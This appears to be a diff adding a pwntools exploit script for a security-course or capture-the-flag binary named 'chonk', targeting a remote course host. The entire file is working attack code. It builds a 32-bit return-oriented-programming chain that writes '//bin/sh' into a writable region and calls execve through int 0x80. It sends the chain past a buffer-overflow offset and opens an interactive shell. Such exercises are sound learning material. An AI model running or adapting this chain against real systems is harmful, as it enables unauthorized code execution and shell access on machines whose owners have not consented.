@@ -1,0 +1,115 @@
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+# This exploit template was generated via:
+# $ pwn template
+from pwn import *
+
+# Set up pwntools for the correct architecture
+context.update(arch='i386')
+exe = './chonk' #Change this
+
+PROGNAME = exe
+REMOTE = "comp6447.wtf" #Change this
+REMOTEPORT = 29224 #Change this
+global p
+global e
+global global_timeout
+
+e = ELF(PROGNAME)
+
+# Many built-in settings can be controlled on the command-line and show up
+# in "args".  For example, to dump all data sent/received, and disable ASLR
+# for all created processes...
+# ./exploit.py DEBUG NOASLR
+
+
+def start(argv=[], *a, **kw):
+    '''Start the exploit against the target.'''
+    if args.GDB:
+        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
+    else:
+        return process([exe] + argv, *a, **kw)
+
+# Specify your GDB script here for debugging
+# GDB will be launched if the exploit is run via e.g.
+# ./exploit.py GDB
+gdbscript = '''
+continue
+'''.format(**locals())
+
+if args.REMOTE:
+    global_timeout = 3
+    p = remote(REMOTE, REMOTEPORT)
+else:
+    global_timeout = 0.5
+    p = process(PROGNAME)
+    p = start()
+#===========================================================
+#                    EXPLOIT GOES HERE
+#===========================================================
+offset = cyclic_find(0x61616164)
+inc_eax = 0x08061433
+# ALt: 0x08065480
+int_0x80 = 0x0804a422
+pop_eax = 0x080518e5
+pop_edx_ebx_esi = 0x0805f5b6
+edx_eax = 0x08058eb2
+eax_edx = 0x08090dd8
+xor_eax = 0x0804fa20
+pop_ecx_alf6 =  0x0805d761
+writable_region = 0x8049d5a
+junk = p32(0)
+
+chain = (
+    p32(pop_eax)
+    + b'//bi'
+    + p32(pop_edx_ebx_esi)
+    + p32(writable_region)
+    + junk
+    + junk
+    + p32(edx_eax)
+    + p32(pop_eax)
+    + b'n/sh'
+    + p32(pop_edx_ebx_esi)
+    + p32(writable_region+4)
+    + junk
+    + junk
+    + p32(edx_eax)
+    + p32(xor_eax)
+    + p32(pop_edx_ebx_esi)
+    + p32(writable_region+8)
+    + junk
+    + junk
+    + p32(edx_eax)
+
+    + p32(pop_eax)
+    + p32(writable_region)
+    + p32(pop_edx_ebx_esi)
+    + p32(writable_region+12)
+    + junk
+    + junk
+    + p32(edx_eax)
+    + p32(xor_eax)
+    + p32(pop_edx_ebx_esi)
+    + p32(writable_region+16)
+    + junk
+    + junk
+    + p32(edx_eax)
+    + p32(pop_edx_ebx_esi)
+    + p32(writable_region+8)
+    + p32(writable_region)
+    + junk
+    + p32(pop_ecx_alf6)
+    + p32(writable_region+12)
+    
+    + p32(xor_eax)
+    + p32(inc_eax)*11
+    + p32(int_0x80)
+)
+p.recvline()
+payload = fit({
+    offset: chain
+})
+p.sendline(payload)
+p.interactive()
+
